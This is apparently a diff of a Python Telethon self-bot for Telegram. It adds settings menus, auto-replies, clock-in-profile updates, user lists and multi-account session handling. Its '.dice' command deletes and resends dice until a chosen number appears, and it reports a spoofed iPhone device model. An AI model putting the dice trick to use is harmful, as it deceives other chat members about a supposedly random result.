+└ • `.history عدد` - 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒉𝒊𝒔𝒕𝒐𝒓𝒚
+        """
+        await event.reply(tools_text)
+        await event.delete()
+    
+    async def settings_handler(self, event):
+        """منوی تنظیمات"""
+        settings_text = """
+┌─────────────────────
+│  ⚙️ **Bᴏᴛ Sᴇᴛᴛɪɴɢs**  
+└─────────────────────
+
+🌐 **𝑶𝒏𝒍𝒊𝒏𝒆 𝑺𝒕𝒂𝒕𝒖𝒔:**
+├ • `.online on` - 𝑨𝒍𝒘𝒂𝒚𝒔 𝒐𝒏𝒍𝒊𝒏𝒆
+└ • `.online off` - 𝑫𝒆𝒇𝒂𝒖𝒍𝒕 𝒔𝒕𝒂𝒕𝒖𝒔
+
+⌨️ **𝑻𝒚𝒑𝒊𝒏𝒈 𝑨𝒄𝒕𝒊𝒐𝒏:**
+├ • `.typing on` - 𝑬𝒏𝒂𝒃𝒍𝒆 𝒕𝒚𝒑𝒊𝒏𝒈
+├ • `.typing off` - 𝑫𝒊𝒔𝒂𝒃𝒍𝒆 𝒕𝒚𝒑𝒊𝒏𝒈
+└ • `.typing 10` - 𝑺𝒆𝒕 𝒅𝒖𝒓𝒂𝒕𝒊𝒐𝒏 (𝒔𝒆𝒄𝒐𝒏𝒅𝒔)
+
+🤖 **𝑺𝒎𝒂𝒓𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔:**
+├ • `.secretary on/off` - 𝑺𝒎𝒂𝒓𝒕 𝒔𝒆𝒄𝒓𝒆𝒕𝒂𝒓𝒚
+├ • `.autoreply on/off` - 𝑨𝒖𝒕𝒐 𝒓𝒆𝒑𝒍𝒚
+└ • `.autoforward on/off` - 𝑨𝒖𝒕𝒐 𝒇𝒐𝒓𝒘𝒂𝒓𝒅
+
+🎨 **𝑨𝒑𝒑𝒆𝒂𝒓𝒂𝒏𝒄𝒆:**
+├ • `.timename on/off` - 𝑻𝒊𝒎𝒆 𝒊𝒏 𝒏𝒂𝒎𝒆
+├ • `.timebio on/off` - 𝑻𝒊𝒎𝒆 𝒊𝒏 𝒃𝒊𝒐
+└ • `.font 1-10` - 𝑪𝒉𝒂𝒏𝒈𝒆 𝒇𝒐𝒏𝒕
+
+👥 **𝑼𝒔𝒆𝒓 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕:**
+├ • `.addcrash 𝑰𝑫` - 𝑨𝒅𝒅 𝒕𝒐 𝒄𝒓𝒖𝒔𝒉 𝒍𝒊𝒔𝒕
+├ • `.delcrash 𝑰𝑫` - 𝑹𝒆𝒎𝒐𝒗𝒆 𝒇𝒓𝒐𝒎 𝒄𝒓𝒖𝒔𝒉
+├ • `.addenemy 𝑰𝑫` - 𝑨𝒅𝒅 𝒕𝒐 𝒆𝒏𝒆𝒎𝒚
+└ • `.delenemy 𝑰𝑫` - 𝑹𝒆𝒎𝒐𝒗𝒆 𝒇𝒓𝒐𝒎 𝒆𝒏𝒆𝒎𝒚
+        """
+        await event.reply(settings_text)
+        await event.delete()
+    
+    async def forward_handler(self, event):
+        """منوی فوروارد خودکار"""
+        forward_text = """
+┌─────────────────────
+│  🔄 **Aᴜᴛᴏ Fᴏʀᴡᴀʀᴅ**  
+└─────────────────────
+
+📡 **𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔:**
+├ • 𝑨𝒖𝒕𝒐𝒎𝒂𝒕𝒊𝒄𝒂𝒍𝒍𝒚 𝒇𝒐𝒓𝒘𝒂𝒓𝒅 𝒎𝒆𝒔𝒔𝒂𝒈𝒆𝒔
+├ • 𝑺𝒖𝒑𝒑𝒐𝒓𝒕𝒔 𝒎𝒖𝒍𝒕𝒊𝒑𝒍𝒆 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔
+└ • 𝑹𝒆𝒂𝒍-𝒕𝒊𝒎𝒆 𝒇𝒐𝒓𝒘𝒂𝒓𝒅𝒊𝒏𝒈
+        """
+        await event.reply(forward_text)
+        await event.delete()
+
+    async def load_secretary_messages(self):
+        """بارگذاری پیام‌های منشی از دیتابیس"""
+        try:
+            db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
+            conn = sqlite3.connect(db)
+            cursor = conn.cursor()
+            cursor.execute('SELECT pattern, response FROM secretary WHERE is_active = 1')
+            results = cursor.fetchall()
+            conn.close()
+            
+            self.secretary_messages = {}
+            for pattern, response in results:
+                self.secretary_messages[pattern.lower()] = response
+                
+            print(f"✅ {len(self.secretary_messages)} پیام منشی برای {self.phone} بارگذاری شد")
+        except Exception as e:
+            print(f"خطا در بارگذاری پیام‌های منشی برای {self.phone}: {e}")
+    
+    async def load_auto_forward_settings(self):
+        """بارگذاری تنظیمات فوروارد خودکار"""
+        try:
+            db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
+            conn = sqlite3.connect(db)
+            cursor = conn.cursor()
+            cursor.execute('SELECT source_channel, target_group FROM auto_forward WHERE is_active = 1')
+            results = cursor.fetchall()
+            conn.close()
+            
+            self.auto_forward_settings = {}
+            for source, target in results:
+                if source not in self.auto_forward_settings:
+                    self.auto_forward_settings[source] = []
+                self.auto_forward_settings[source].append(target)
+                
+            print(f"✅ {len(results)} تنظیمات فوروارد برای {self.phone} بارگذاری شد")
+        except Exception as e:
+            print(f"خطا در بارگذاری تنظیمات فوروارد برای {self.phone}: {e}")
+    
+    async def auto_reply_secretary(self):
+        """پاسخگویی خودکار منشی"""
+        @self.client.on(events.NewMessage(incoming=True))
+        async def secretary_handler(event):
+            try:
+                if event.sender_id == self.owner_id:
+                    return
+                    
+                js = self.get_data()
+                if js.get('secretary') != 'on':
+                    return
+                    
+                message_text = event.raw_text.lower().strip()
+                
+                if any(greeting in message_text for greeting in ['سلام', 'hello', 'hi', 'سلامت']):
+                    await event.reply(f"🌹 **درود!**\nچطور می‌تونم کمک کنم؟")
+                    
+                elif any(greeting in message_text for greeting in ['چطوری', 'حالتون', 'خوبی', 'چخبر']):
+                    await event.reply(f"✨ **سلامت باشید!**\nمن خوبم ممنون 😊\nشما چطورید؟")
+                    
+                elif any(time_word in message_text for time_word in ['ساعت', 'time', 'چند شد']):
+                    current_time = datetime.now().strftime("%H:%M:%S")
+                    await event.reply(f"🕒 **ساعت فعلی:** `{current_time}`")
+                    
+                elif any(date_word in message_text for date_word in ['تاریخ', 'date', 'امروز چندمه']):
+                    current_date = datetime.now().strftime("%Y/%m/%d")
+                    await event.reply(f"📅 **تاریخ امروز:** `{current_date}`")
+                    
+                elif message_text in self.secretary_messages:
+                    response = self.secretary_messages[message_text]
+                    response = response.replace('{time}', datetime.now().strftime("%H:%M"))
+                    response = response.replace('{date}', datetime.now().strftime("%Y/%m/%d"))
+                    await event.reply(response)
+                    
+            except Exception as e:
+                print(f"خطا در منشی هوشمند برای {self.phone}: {e}")
+    
+    async def register_settings_handlers(self):
+        """ثبت هندلرهای تنظیمات"""
+        
+        @self.client.on(events.NewMessage(pattern=r'\.(online|typing|secretary|autoreply|autoforward|timename|timebio) (on|off)'))
+        async def settings_handler(event):
+            try:
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                command = event.pattern_match.group(1)
+                value = event.pattern_match.group(2)
+                
+                js = self.get_data()
+                old_value = js.get(command, 'off')
+                js[command] = value
+                self.put_data(js)
+                
+                if command == "online" and value == "on":
+                    await self.set_online_status()
+                elif command == "timename" and value == "on":
+                    await self.force_time_update()
+                    response_msg = "✅ **زمان در نام خانوادگی فعال شد**\n🕒 زمان از الان در نام خانوادگی نمایش داده می‌شود"
+                elif command == "timename" and value == "off":
+                    me = await self.client.get_me()
+                    original_last_name = me.last_name or ""
+                    if original_last_name and any(char in original_last_name for char in '𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿₀₁₂₃₄₅₆₇₈₉'):
+                        parts = original_last_name.split(' ')
+                        clean_parts = [part for part in parts if not any(char in part for char in '𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿₀₁₂₃₄₅₆₇₈₉')]
+                        clean_last_name = ' '.join(clean_parts)
+                        await self.client(functions.account.UpdateProfileRequest(last_name=clean_last_name))
+                    response_msg = "✅ **زمان در نام خانوادگی غیرفعال شد**"
+                elif command == "timebio" and value == "on":
+                    await self.force_time_update()
+                    try:
+                        full_user = await self.client(GetFullUserRequest('me'))
+                        js["original_bio"] = full_user.full_user.about or ""
+                        self.put_data(js)
+                    except Exception as e:
+                        print(f"خطا در ذخیره بیوگرافی برای {self.phone}: {e}")
+                    response_msg = "✅ **زمان در بیوگرافی فعال شد**\n🕒 زمان از الان در بیوگرافی نمایش داده می‌شود"
+                elif command == "timebio" and value == "off":
+                    original_bio = js.get("original_bio", "")
+                    await self.client(functions.account.UpdateProfileRequest(about=original_bio))
+                    response_msg = "✅ **زمان در بیوگرافی غیرفعال شد**"
+                else:
+                    command_names = {
+                        "online": "حالت آنلاین",
+                        "typing": "اکشن تایپینگ",
+                        "secretary": "منشی هوشمند",
+                        "autoreply": "پاسخگویی خودکار",
+                        "autoforward": "فوروارد خودکار"
+                    }
+                    response_msg = f"✅ **{command_names.get(command, command)}** `{value}` شد"
+                
+                await event.reply(response_msg)
+                await event.delete()
+                
+            except Exception as e:
+                print(f"خطا در تنظیمات برای {self.phone}: {e}")
+                try:
+                    await event.reply(f"❌ **خطا در اجرای دستور:** {e}")
+                except:
+                    pass
+        
+        @self.client.on(events.NewMessage(pattern=r'\.typing (\d+)'))
+        async def typing_duration_handler(event):
+            try:
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                duration = event.pattern_match.group(1)
+                js = self.get_data()
+                js["typing_duration"] = duration
+                self.put_data(js)
+                
+                await event.reply(f"✅ **مدت زمان تایپینگ** به `{duration}` ثانیه تنظیم شد")
+                await event.delete()
+                
+            except Exception as e:
+                print(f"خطا در تنظیم مدت تایپینگ برای {self.phone}: {e}")
+        
+        @self.client.on(events.NewMessage(pattern=r'\.font ([1-9]|10)'))
+        async def font_handler(event):
+            try:
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                font_num = event.pattern_match.group(1)
+                js = self.get_data()
+                js["font"] = font_num
+                self.put_data(js)
+                
+                await event.reply(f"✅ **فونت زمان** به شماره `{font_num}` تغییر کرد")
+                await event.delete()
+                
+            except Exception as e:
+                print(f"خطا در تغییر فونت برای {self.phone}: {e}")
+        
+        @self.client.on(events.NewMessage(pattern=r'\.(addcrash|delcrash|addenemy|delenemy) (.*)'))
+        async def user_management_handler(event):
+            try:
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                command = event.pattern_match.group(1)
+                user_id_str = event.pattern_match.group(2)
+                
+                try:
+                    user_id = int(user_id_str)
+                except ValueError:
+                    await event.reply("❌ **لطفاً یک ID معتبر وارد کنید**")
+                    return
+                    
+                js = self.get_data()
+                
+                if command == "addcrash":
+                    if user_id in js.get('crash', []):
+                        txt = "✅ **کاربر از قبل در لیست کراش بود**"
+                    else:
+                        js.setdefault('crash', []).append(user_id)
+                        txt = "✅ **کاربر به لیست کراش اضافه شد**"
+                        
+                elif command == "delcrash":
+                    if user_id in js.get('crash', []):
+                        js['crash'] = [x for x in js.get('crash', []) if x != user_id]
+                        txt = "✅ **کاربر از لیست کراش حذف شد**"
+                    else:
+                        txt = "❌ **کاربر در لیست کراش نبود**"
+                        
+                elif command == "addenemy":
+                    if user_id in js.get('enemy', []):
+                        txt = "✅ **کاربر از قبل در لیست دشمن بود**"
+                    else:
+                        js.setdefault('enemy', []).append(user_id)
+                        txt = "✅ **کاربر به لیست دشمن اضافه شد**"
+                        
+                elif command == "delenemy":
+                    if user_id in js.get('enemy', []):
+                        js['enemy'] = [x for x in js.get('enemy', []) if x != user_id]
+                        txt = "✅ **کاربر از لیست دشمن حذف شد**"
+                    else:
+                        txt = "❌ **کاربر در لیست دشمن نبود**"
+                
+                self.put_data(js)
+                await event.reply(txt)
+                await event.delete()
+                
+            except Exception as e:
+                print(f"خطا در مدیریت کاربران برای {self.phone}: {e}")
+        
+        @self.client.on(events.NewMessage(pattern=r'\.dice ([1-6])'))
+        async def dice_handler(event):
+            try:
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                target_number = int(event.pattern_match.group(1))
+                await event.delete()
+                
+                send = await self.client.send_file(event.chat_id, InputMediaDice('🎲'))
+                while send.media.value != target_number:
+                    await self.client.delete_messages(event.chat_id, send.id)
+                    send = await self.client.send_file(event.chat_id, InputMediaDice('🎲'))
+                    
+            except Exception as e:
+                print(f"خطا در دستور dice برای {self.phone}: {e}")
+        
+        @self.client.on(events.NewMessage(pattern=r'\.clean (\d+)'))
+        async def clean_handler(event):
+            try:
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                count = int(event.pattern_match.group(1))
+                message_id = event.message.id
+                deleted = 0
+                
+                for i in range(count):
+                    try:
+                        await self.client.delete_messages(event.chat_id, message_id - i)
+                        deleted += 1
+                    except:
+                        pass
+                        
+                await event.reply(f"✅ **{deleted}** پیام پاک شد")
+                
+            except Exception as e:
+                print(f"خطا در دستور clean برای {self.phone}: {e}")
+        
+        @self.client.on(events.NewMessage(pattern=r'\.(football|basket|dart|slot)'))
+        async def games_handler(event):
+            try:
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                game_type = event.pattern_match.group(1)
+                emojis = {
+                    'football': '⚽',
+                    'basket': '🏀', 
+                    'dart': '🎯',
+                    'slot': '🎰'
+                }
+                
+                if game_type in emojis:
+                    await self.client.send_file(event.chat_id, InputMediaDice(emojis[game_type]))
+                    await event.delete()
+                    
+            except Exception as e:
+                print(f"خطا در دستور بازی برای {self.phone}: {e}")
+        
+        @self.client.on(events.NewMessage(pattern=r'\.addreply (.+)\|(.+)'))
+        async def add_reply_handler(event):
+            try:
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                pattern = event.pattern_match.group(1).strip().lower()
+                response = event.pattern_match.group(2).strip()
+                
+                db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
+                conn = sqlite3.connect(db)
+                cursor = conn.cursor()
+                cursor.execute('INSERT INTO secretary (pattern, response) VALUES (?, ?)', (pattern, response))
+                conn.commit()
+                conn.close()
+                
+                self.secretary_messages[pattern] = response
+                await event.reply(f"✅ **پاسخ جدید افزوده شد:**\n**الگو:** `{pattern}`\n**پاسخ:** `{response}`")
+                await event.delete()
+                
+            except Exception as e:
+                print(f"خطا در افزودن پاسخ برای {self.phone}: {e}")
+    
+    async def force_time_update(self):
+        """اجبار به به‌روزرسانی فوری زمان"""
+        try:
+            self.last_time_update = 0
+            await self.update_profile_time()
+        except Exception as e:
+            print(f"خطا در به‌روزرسانی فوری زمان برای {self.phone}: {e}")
+    
+    async def update_profile_time(self):
+        """به‌روزرسانی زمان در پروفایل"""
+        while self.is_running and not self.shutdown_requested:
+            try:
+                js = self.get_data()
+                current_time = time.time()
+                
+                if current_time - self.last_time_update < 60:
+                    await asyncio.sleep(60 - (current_time - self.last_time_update))
+                    continue
+                
+                if js.get('timename') == 'off' and js.get('timebio') == 'off': 
+                    await asyncio.sleep(60)
+                    continue
+                    
+                tz = pytz.timezone("Asia/Tehran")
+                now = datetime.now(tz).strftime("%H:%M")
+                idx = int(js.get('font', '1')) - 1
+                if 0 <= idx < len(self.fonts):
+                    f = self.fonts[idx]
+                    try:
+                        ft = now.translate(str.maketrans("0123456789", f))
+                    except:
+                        ft = now
+                else:
+                    ft = now
+                
+                updates_done = []
+                
+                if js.get('timebio') == 'on': 
+                    original_bio = js.get('original_bio', '')
+                    if ' ' in original_bio:
+                        parts = original_bio.split(' ')
+                        if any(char in parts[-1] for char in '𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿₀₁₂₃₄₅₆₇₈₉'):
+                            original_bio = ' '.join(parts[:-1])
+                    
+                    new_bio = f"{original_bio} {ft}".strip()
+                    await self.client(functions.account.UpdateProfileRequest(about=new_bio))
+                    updates_done.append("بیوگرافی")
+                    print(f"✅ بیوگرافی برای {self.phone} به‌روزرسانی شد: {new_bio}")
+                
+                if js.get('timename') == 'on': 
+                    await self.client(functions.account.UpdateProfileRequest(last_name=ft))
+                    updates_done.append("نام خانوادگی")
+                    print(f"✅ نام خانوادگی برای {self.phone} به‌روزرسانی شد: {ft}")
+                
+                if updates_done:
+                    print(f"✅ به‌روزرسانی زمان برای {self.phone}: {', '.join(updates_done)}")
+                
+                self.last_time_update = current_time
+                await asyncio.sleep(60)
+                
+            except Exception as e:
+                print(f"خطا در به‌روزرسانی زمان برای {self.phone}: {e}")
+                await asyncio.sleep(60)
+    
+    def get_data(self):
+        """خواندن داده‌ها از دیتابیس"""
+        try:
+            db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
+            conn = sqlite3.connect(db)
+            cur = conn.cursor()
+            cur.execute('SELECT key, value FROM settings')
+            settings = {k: v for k, v in cur.fetchall()}
+            cur.execute('SELECT user_id FROM crash')
+            settings['crash'] = [r[0] for r in cur.fetchall()]
+            cur.execute('SELECT user_id FROM enemy')
+            settings['enemy'] = [r[0] for r in cur.fetchall()]
+            conn.close()
+            return settings
+        except Exception as e:
+            print(f"خطا در خواندن داده‌ها برای {self.phone}: {e}")
+            return {}
+    
+    def put_data(self, data):
+        """نوشتن داده‌ها به دیتابیس"""
+        try:
+            db = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
+            conn = sqlite3.connect(db)
+            cur = conn.cursor()
+            for k, v in data.items():
+                if k not in ['crash', 'enemy']:
+                    cur.execute('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)', (k, v))
+            if 'crash' in data:
+                cur.execute('DELETE FROM crash')
+                cur.executemany('INSERT INTO crash(user_id) VALUES (?)', [(u,) for u in data['crash']])
+            if 'enemy' in data:
+                cur.execute('DELETE FROM enemy')
+                cur.executemany('INSERT INTO enemy(user_id) VALUES (?)', [(u,) for u in data['enemy']])
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            print(f"خطا در نوشتن داده‌ها برای {self.phone}: {e}")
+    
+    async def check_expiration(self):
+        """بررسی انقضای اکانت"""
+        while self.is_running and not self.shutdown_requested:
+            if not self.is_self_valid():
+                print(f"❌ اکانت {self.phone} منقضی شده است. توقف...")
+                await send_to_admin(self.client, f"❌ اکانت {self.phone} منقضی شده است", self.phone)
+                await self.client.disconnect()
+                break
+            await asyncio.sleep(60)
+    
+    def is_self_valid(self):
+        """بررسی اعتبار اکانت"""
+        try:
+            if not os.path.exists(USERS_DB):
+                return True
+                
+            conn = sqlite3.connect(USERS_DB)
+            c = conn.cursor()
+            c.execute("SELECT expiration_date FROM users WHERE phone = ?", (self.phone,))
+            result = c.fetchone()
+            conn.close()
+            if result and result[0]:
+                expiration_date = datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
+                return datetime.now() < expiration_date
+            return True
+        except Exception as e:
+            print(f"خطا در بررسی انقضا برای {self.phone}: {e}")
+            return True
+    
+    async def run(self):
+        """اجرای اکانت"""
+        try:
+            success = await self.robust_initialize()
+            if success:
+                print(f"🚀 اکانت {self.phone} در حال اجرا است...")
+                await self.client.run_until_disconnected()
+            else:
+                print(f"❌ اکانت {self.phone} راه‌اندازی نشد")
+        except Exception as e:
+            print(f"❌ خطا در اجرای اکانت {self.phone}: {e}")
+        finally:
+            self.is_running = False
+
+async def create_session_file(phone, session_file):
+    """ایجاد فایل سشن جدید"""
+    try:
+        print(f"📱 ایجاد سشن جدید برای {phone}...")
+        
+        client = TelegramClient(StringSession(), API_ID, API_HASH,
+                              device_model="iPhone 15 Pro",
+                              system_version="iOS 17.1",
+                              app_version="10.0.0")
+        
+        await client.connect()
+        
+        sent_code = await client.send_code_request(phone)
+        print(f"✅ کد تأیید برای {phone} ارسال شد")
+        
+        code = input(f"📝 لطفاً کد تأیید ارسال شده برای {phone} را وارد کنید: ").strip()
+        
+        try:
+            await client.sign_in(phone, code)
+            print(f"✅ لاگین موفقیت‌آمیز برای {phone}")
+        except SessionPasswordNeededError:
+            password = input("🔐 لطفاً رمز دو مرحله‌ای را وارد کنید: ")
+            await client.sign_in(password=password)
+            print(f"✅ لاگین با رمز دو مرحله‌ای موفقیت‌آمیز برای {phone}")
+        
+        session_string = client.session.save()
+        with open(session_file, 'w') as f:
+            f.write(session_string)
+        
+        print(f"✅ سشن برای {phone} در {session_file} ذخیره شد")
+        await client.disconnect()
+        return session_string
+        
+    except Exception as e:
+        print(f"❌ خطا در ایجاد سشن برای {phone}: {e}")
+        return None
+
+async def main():
+    """تابع اصلی"""
+    if len(sys.argv) < 3:
+        print("""
+🚀 **Sᴇʟғ Bᴏᴛ Lᴀᴜɴᴄʜᴇʀ**
+
+📝 **𝑼𝒔𝒂𝒈𝒆:**
+├ • 𝑨𝒅𝒅 𝒏𝒆𝒘 𝒂𝒄𝒄𝒐𝒖𝒏𝒕:
+│   python script.py <phone> <session_file>
+│
+├ • 𝑹𝒖𝒏 𝒂𝒍𝒍 𝒂𝒄𝒄𝒐𝒖𝒏𝒕𝒔:
+│   python script.py --multi
+│
+├ • 𝑪𝒓𝒆𝒂𝒕𝒆 𝒏𝒆𝒘 𝒔𝒆𝒔𝒔𝒊𝒐𝒏:
+│   python script.py --create <phone> <session_file>
+└
+📞 **𝑬𝒙𝒂𝒎𝒑𝒍𝒆𝒔:**
+├ • python script.py +1234567890 session1.txt
+├ • python script.py --multi
+└ • python script.py --create +1234567890 newsession.txt
+        """)
+        sys.exit(1)
+    
+    account_manager = AccountManager()
+    
+    if sys.argv[1] == "--create":
+        if len(sys.argv) < 4:
+            print("❌ لطفاً شماره و نام فایل سشن را وارد کنید")
+            sys.exit(1)
+        
+        phone = sys.argv[2]
+        session_file = sys.argv[3]
+        
+        session_string = await create_session_file(phone, session_file)
+        if session_string:
+            account_manager.add_account(phone, session_string)
+            print(f"✅ اکانت {phone} با موفقیت اضافه شد")
         else:
-            await message.reply_text("❌ پنل یافت نشد")
+            print(f"❌ خطا در ایجاد سشن برای {phone}")
+        
+    elif sys.argv[1] == "--multi":
+        print("🔧 راه‌اندازی حالت چند اکانته...")
+        accounts = account_manager.get_all_accounts()
+        
+        if not accounts:
+            print("❌ هیچ اکانتی در دیتابیس یافت نشد.")
+            print("برای افزودن اکانت از دستور زیر استفاده کنید:")
+            print("python script.py --create <phone> <session_file>")
+            sys.exit(1)
+        
+        print(f"✅ تعداد {len(accounts)} اکانت برای راه‌اندازی یافت شد")
+        
+        tasks = []
+        for phone, session_string in accounts:
+            print(f"🔄 راه‌اندازی اکانت {phone}...")
+            account = TelegramAccount(phone, session_string, account_manager)
+            task = asyncio.create_task(account.run())
+            tasks.append(task)
             await asyncio.sleep(3)
-            await message.delete()
-if __name__ == "__main__":
-    if USER_ID:
-        print(f"✅ سلف‌بات برای کاربر {USER_ID} در حال اجرا...")
-        print(f"📱 شماره: {PHONE}")
+        
+        print("🚀 تمام اکانت‌ها در حال اجرا هستند...")
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
     else:
-        print("⚠️ سلف‌بات در حالت معمولی اجرا شد")
-    app.run()
+        phone = sys.argv[1]
+        session_file = sys.argv[2]
+        
+        if not os.path.exists(session_file):
+            print(f"❌ فایل سشن {session_file} یافت نشد.")
+            print("برای ایجاد سشن جدید از دستور زیر استفاده کنید:")
+            print(f"python script.py --create {phone} {session_file}")
+            sys.exit(1)
+        
+        try:
+            with open(session_file, 'r') as f:
+                session_str = f.read().strip()
+        except Exception as e:
+            print(f"❌ خطا در خواندن فایل سشن: {e}")
+            sys.exit(1)
+        
+        if not session_str:
+            print(f"❌ فایل سشن {session_file} خالی است.")
+            print("برای ایجاد سشن جدید از دستور زیر استفاده کنید:")
+            print(f"python script.py --create {phone} {session_file}")
+            sys.exit(1)
+        
+        account_manager.add_account(phone, session_str)
+        
+        print(f"🔄 راه‌اندازی اکانت {phone}...")
+        account = TelegramAccount(phone, session_str, account_manager)
+        await account.run()
+
+if __name__ == '__main__':
+    try:
+        print("""
+┌────────────────────
+│  🚀 **Sᴇʟғ Bᴏᴛ Sᴛᴀʀᴛᴇᴅ**  
+│  🔮 **𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚:** @Sourrce_kade
+└─────────────────────
+        """)
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n⏹ **برنامه توسط کاربر متوقف شد**")
+    except Exception as e:
+        print(f"❌ **خطای غیرمنتظره:** {e}")
+        
